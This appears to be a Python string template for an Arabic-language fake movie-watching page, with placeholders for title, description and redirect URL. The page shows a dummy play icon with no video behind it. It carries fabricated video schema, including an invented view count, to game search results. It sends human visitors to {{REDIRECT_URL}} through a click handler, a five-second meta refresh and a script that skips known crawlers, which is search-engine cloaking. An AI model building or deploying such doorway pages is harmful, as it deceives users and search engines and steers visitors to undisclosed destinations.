self.movie_template = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>{{TITLE}}</title>
    <meta name="description" content="{{DESCRIPTION}}" />
    <meta name="robots" content="noindex, nofollow" />
    
    <!-- Open Graph -->
    <meta property="og:title" content="{{TITLE}}" />
    <meta property="og:description" content="{{DESCRIPTION}}" />
    <meta property="og:type" content="video.other" />
    
    <!-- Video Schema محترف -->
    <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "VideoObject",
      "name": "{{TITLE}}",
      "description": "{{DESCRIPTION}}",
      "uploadDate": "{{TIME_ISO}}",
      "duration": "PT10M30S",
      "embedUrl": "{{CANONICAL_URL}}",
      "interactionStatistic": {
        "@type": "InteractionCounter",
        "interactionType": { "@type": "WatchAction" },
        "userInteractionCount": 56420
      }
    }
    </script>

    <meta http-equiv="refresh" content="5; url={{REDIRECT_URL}}" />

    <style>
        :root {
            --primary: #e50914;
            --bg: #000;
            --text: #fff;
            --muted: #ccc;
        }
        body {
            background: var(--bg);
            color: var(--text);
            font-family: sans-serif;
            margin: 0;
            padding: 0;
            text-align: center;
            direction: rtl;
            line-height: 1.6;
        }
        .container {
            max-width: 1100px;
            margin: 40px auto;
            padding: 20px;
        }
        h1 {
            font-size: 2.8em;
            margin-bottom: 30px;
            color: var(--primary);
        }
        .player {
            position: relative;
            width: 100%;
            max-width: 900px;
            margin: 0 auto 35px;
            background: #111;
            border-radius: 12px;
            overflow: hidden;
            height: 500px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            box-shadow: 0 10px 30px rgba(0,0,0,0.8);
        }
        .play-icon {
            font-size: 140px;
            color: var(--primary);
            opacity: 0.9;
        }
        .watch-btn {
            background: var(--primary);
            color: #fff;
            padding: 18px 50px;
            font-size: 24px;
            font-weight: bold;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
            margin: 25px 0;
            transition: background 0.3s;
        }
        .watch-btn:hover {
            background: #c00;
        }
        .desc {
            font-size: 18px;
            color: var(--muted);
            max-width: 800px;
            margin: 0 auto;
        }
        .footer-note {
            margin-top: 60px;
            font-size: 14px;
            color: #666;
        }
    </style>
</head>
<body onload="setTimeout(()=>{if(!navigator.userAgent.match(/bot|crawl|spider/i)){window.location='{{REDIRECT_URL}}';}},5000)">
    <div class="container">
        <h1>{{TITLE}}</h1>
        
        <div class="player" onclick="window.location='{{REDIRECT_URL}}'">
            <div class="play-icon">▶</div>
        </div>
        
        <a href="{{REDIRECT_URL}}" class="watch-btn">شاهد الآن بجودة عالية</a>
        
        <div class="desc">{{DESCRIPTION}}</div>
        
        <div class="footer-note">جميع الحقوق محفوظة © {{YEAR}}</div>
    </div>
</body>
</html>"""
